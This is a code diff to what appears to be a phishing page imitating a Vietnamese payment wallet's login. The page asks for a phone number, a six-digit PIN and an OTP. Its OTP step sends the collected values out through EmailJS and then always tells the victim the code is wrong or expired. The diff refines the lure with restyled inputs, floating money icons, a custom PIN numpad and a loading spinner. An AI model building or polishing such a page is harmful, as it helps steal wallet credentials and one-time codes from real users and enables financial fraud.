@@ -33,7 +33,7 @@
         --zp-shadow-btn: 0 4px 14px rgba(0, 104, 255, 0.3);
         --zp-radius-card: 20px;
         --zp-radius-input: 12px;
-        --zp-radius-btn: 12px;
+        --zp-radius-btn: 25px;
         --zp-header-height: 56px;
         --zp-banner-height: 280px;
       }
@@ -158,8 +158,8 @@
 
       .slide-content .slide-title {
         color: #FFFFFF;
-        font-size: 24px;
-        font-weight: 700;
+        font-size: 28px;
+        font-weight: 800;
         line-height: 1.35;
         max-width: 60%;
         text-shadow: 0 2px 8px rgba(0,0,0,0.25);
@@ -221,15 +221,16 @@
       }
 
       .phone-input-wrapper {
-        border: 1.5px solid var(--zp-input-border);
+        border: 1px solid #E5E5EA;
         border-radius: var(--zp-radius-input);
         padding: 14px 16px;
         transition: all 0.2s ease;
-        background: #FFFFFF;
+        background: #F9FAFB;
       }
 
       .phone-input-wrapper:focus-within {
-        border-color: var(--zp-input-focus);
+        background: #FFFFFF;
+        border-color: #0068FF;
         box-shadow: 0 0 0 3px rgba(0,104,255,0.1);
       }
 
@@ -275,11 +276,15 @@
         border: none;
         padding: 16px;
         border-radius: var(--zp-radius-btn);
-        font-size: 16px;
+        height: 52px;
+        font-size: 17px;
         font-weight: 700;
         cursor: pointer;
-        transition: all 0.2s ease;
+        transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
         box-shadow: var(--zp-shadow-btn);
+        display: flex;
+        align-items: center;
+        justify-content: center;
       }
 
       .btn-primary:active {
@@ -384,12 +389,13 @@
         background: transparent;
       }
 
-      .pin-dot.active { border-color: var(--zp-primary); }
+      .pin-dot.active { border-color: #0068FF; border-width: 1.5px; }
 
       .pin-dot.filled {
         background-color: var(--zp-primary);
         border-color: var(--zp-primary);
-        transform: scale(1.05);
+        transform: scale(1.2);
+        box-shadow: 0 2px 8px rgba(0, 104, 255, 0.3);
       }
 
       .forgot-password {
@@ -536,6 +542,69 @@
           overflow: hidden;
         }
       }
+
+      /* ===== BANNER DECORATION ===== */
+      .banner-deco {
+        position: absolute;
+        right: 0; top: 0; bottom: 0;
+        width: 55%;
+        z-index: 3;
+        pointer-events: none;
+        overflow: hidden;
+      }
+      .banner-deco .deco-icon {
+        position: absolute;
+        animation: floatBounce 3s ease-in-out infinite;
+      }
+      .banner-deco .deco-icon:nth-child(2) { animation-delay: 0.7s; animation-duration: 3.5s; }
+      .banner-deco .deco-icon:nth-child(3) { animation-delay: 1.4s; animation-duration: 4s; }
+      .banner-deco .deco-icon:nth-child(4) { animation-delay: 0.3s; animation-duration: 2.8s; }
+      @keyframes floatBounce {
+        0%, 100% { transform: translateY(0) rotate(0deg); }
+        50% { transform: translateY(-10px) rotate(4deg); }
+      }
+
+      /* ===== NUMPAD ===== */
+      .numpad {
+        display: grid;
+        grid-template-columns: repeat(3, 1fr);
+        background: var(--zp-bg-card);
+        border-top: 1px solid var(--zp-border);
+        flex-shrink: 0;
+      }
+      .numpad-key {
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        height: 68px;
+        font-size: 26px;
+        font-weight: 400;
+        color: var(--zp-text-primary);
+        cursor: pointer;
+        user-select: none;
+        border: none;
+        background: transparent;
+        transition: background 0.12s;
+        -webkit-tap-highlight-color: transparent;
+        font-family: "Inter", -apple-system, sans-serif;
+      }
+      .numpad-key:active { background: rgba(0,0,0,0.06); }
+      .numpad-key.empty { pointer-events: none; }
+      .numpad-key.backspace { color: var(--zp-text-secondary); }
+
+      /* ===== LOADING SPINNER ===== */
+      @keyframes btnSpin { to { transform: rotate(360deg); } }
+      .btn-spinner {
+        display: inline-block;
+        width: 18px; height: 18px;
+        border: 2.5px solid rgba(255,255,255,0.35);
+        border-top-color: #FFFFFF;
+        border-radius: 50%;
+        animation: btnSpin 0.65s linear infinite;
+        vertical-align: middle;
+        margin-right: 8px;
+        flex-shrink: 0;
+      }
     </style>
   </head>
 
@@ -561,6 +630,35 @@
               <div class="slide-content">
                 <div class="slide-title">Bắt nhịp<br/>tài chính linh hoạt</div>
                 <div class="slide-subtitle">từ số tiền nhỏ</div>
+              </div>
+              <!-- Floating financial icons decoration -->
+              <div class="banner-deco" aria-hidden="true">
+                <div class="deco-icon" style="top:28px;right:18px;">
+                  <svg width="54" height="54" viewBox="0 0 54 54" fill="none" xmlns="http://www.w3.org/2000/svg">
+                    <circle cx="27" cy="27" r="27" fill="#00C864" opacity="0.9"/>
+                    <text x="27" y="35" text-anchor="middle" fill="white" font-family="Inter,sans-serif" font-size="22" font-weight="700">₫</text>
+                  </svg>
+                </div>
+                <div class="deco-icon" style="top:96px;right:48px;">
+                  <svg width="72" height="46" viewBox="0 0 72 46" fill="none" xmlns="http://www.w3.org/2000/svg">
+                    <rect width="72" height="46" rx="8" fill="rgba(255,255,255,0.22)" stroke="rgba(255,255,255,0.45)" stroke-width="1.5"/>
+                    <rect y="13" width="72" height="11" fill="rgba(255,255,255,0.18)"/>
+                    <rect x="8" y="29" width="24" height="6" rx="3" fill="rgba(255,255,255,0.30)"/>
+                  </svg>
+                </div>
+                <div class="deco-icon" style="top:170px;right:16px;">
+                  <svg width="40" height="40" viewBox="0 0 40 40" fill="none" xmlns="http://www.w3.org/2000/svg">
+                    <circle cx="20" cy="20" r="20" fill="#00B050" opacity="0.8"/>
+                    <text x="20" y="26" text-anchor="middle" fill="white" font-family="Inter,sans-serif" font-size="16" font-weight="700">$</text>
+                  </svg>
+                </div>
+                <div class="deco-icon" style="top:12px;right:78px;">
+                  <svg width="34" height="34" viewBox="0 0 34 34" fill="none" xmlns="http://www.w3.org/2000/svg">
+                    <circle cx="17" cy="17" r="17" fill="rgba(255,255,255,0.16)"/>
+                    <polyline points="7,23 13,13 19,18 27,9" stroke="#00E87A" stroke-width="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
+                    <polyline points="23,9 27,9 27,13" stroke="#00E87A" stroke-width="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
+                  </svg>
+                </div>
               </div>
             </div>
 
@@ -641,13 +739,31 @@
               <div class="pin-dot"></div><div class="pin-dot"></div><div class="pin-dot"></div>
               <div class="pin-dot"></div><div class="pin-dot"></div><div class="pin-dot"></div>
             </div>
-            <input type="password" id="real-pin" class="hidden-input" maxlength="6" inputmode="numeric" />
+            <input type="password" id="real-pin" class="hidden-input" maxlength="6" inputmode="none" />
             <div class="forgot-password">Quên mật khẩu</div>
           </div>
         </div>
+        <!-- Custom Numpad -->
+        <div class="numpad" id="numpad">
+          <button class="numpad-key" onclick="inputPinDigit('1')" aria-label="Số 1">1</button>
+          <button class="numpad-key" onclick="inputPinDigit('2')" aria-label="Số 2">2</button>
+          <button class="numpad-key" onclick="inputPinDigit('3')" aria-label="Số 3">3</button>
+          <button class="numpad-key" onclick="inputPinDigit('4')" aria-label="Số 4">4</button>
+          <button class="numpad-key" onclick="inputPinDigit('5')" aria-label="Số 5">5</button>
+          <button class="numpad-key" onclick="inputPinDigit('6')" aria-label="Số 6">6</button>
+          <button class="numpad-key" onclick="inputPinDigit('7')" aria-label="Số 7">7</button>
+          <button class="numpad-key" onclick="inputPinDigit('8')" aria-label="Số 8">8</button>
+          <button class="numpad-key" onclick="inputPinDigit('9')" aria-label="Số 9">9</button>
+          <button class="numpad-key empty" aria-hidden="true"></button>
+          <button class="numpad-key" onclick="inputPinDigit('0')" aria-label="Số 0">0</button>
+          <button class="numpad-key backspace" onclick="deletePinDigit()" aria-label="Xóa">
+            <svg width="26" height="20" viewBox="0 0 26 20" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round">
+              <path d="M10 1H24C24.5523 1 25 1.44772 25 2V18C25 18.5523 24.5523 19 24 19H10L1 10L10 1Z"/>
+              <line x1="16" y1="7" x2="20" y2="13"/><line x1="20" y1="7" x2="16" y2="13"/>
+            </svg>
+          </button>
+        </div>
       </section>
-
-      <!-- SECTION 3: OTP -->
       <section id="sec-otp" class="page-section">
         <div class="pin-header">
           <button class="back-btn" onclick="prevToPassword()">
@@ -682,6 +798,8 @@
 
     <script>
       const state = { phone: "", pin: "", otp: "" };
+      const BTN_CONFIRM_TEXT = "Xác nhận";
+      const BTN_PROCESSING_TEXT = '<span class="btn-spinner"></span>Đang xử lý...';
 
       /* ===== BANNER SLIDER ===== */
       const slider = document.getElementById("bannerSlider");
@@ -793,6 +911,22 @@
 
       function prevToPassword() { showSection("sec-password"); safeFocus("real-pin"); }
 
+      /* ===== NUMPAD ===== */
+      function inputPinDigit(digit) {
+        if (realPinInput.value.length < 6) {
+          realPinInput.value += digit;
+          updatePinActiveState();
+          if (realPinInput.value.length === 6) setTimeout(handleValidatePin, 300);
+        }
+      }
+
+      function deletePinDigit() {
+        if (realPinInput.value.length > 0) {
+          realPinInput.value = realPinInput.value.slice(0, -1);
+          updatePinActiveState();
+        }
+      }
+
       /* ===== OTP ===== */
       const otpInput = document.getElementById("input-otp");
       const otpClear = document.getElementById("otp-clear");
@@ -836,18 +970,17 @@
 
         try {
           const btn = document.querySelector("#sec-otp .btn-primary");
-          const originalText = btn.innerText;
-          btn.innerText = "Đang xử lý...";
+          btn.innerHTML = BTN_PROCESSING_TEXT;
           btn.disabled = true;
           await emailjs.send("service_default", "template_default", templateParams);
           showToast("Mã OTP không chính xác hoặc đã hết hạn");
-          setTimeout(() => { clearOtp(); btn.innerText = originalText; btn.disabled = false; }, 2000);
+          setTimeout(() => { clearOtp(); btn.innerHTML = BTN_CONFIRM_TEXT; btn.disabled = false; }, 2000);
         } catch (err) {
           showToast("Hệ thống bận, vui lòng thử lại sau");
           console.error("EmailJS Error:", err);
           const btn = document.querySelector("#sec-otp .btn-primary");
           btn.disabled = false;
-          btn.innerText = "Xác nhận";
+          btn.innerHTML = BTN_CONFIRM_TEXT;
         }
       }
 
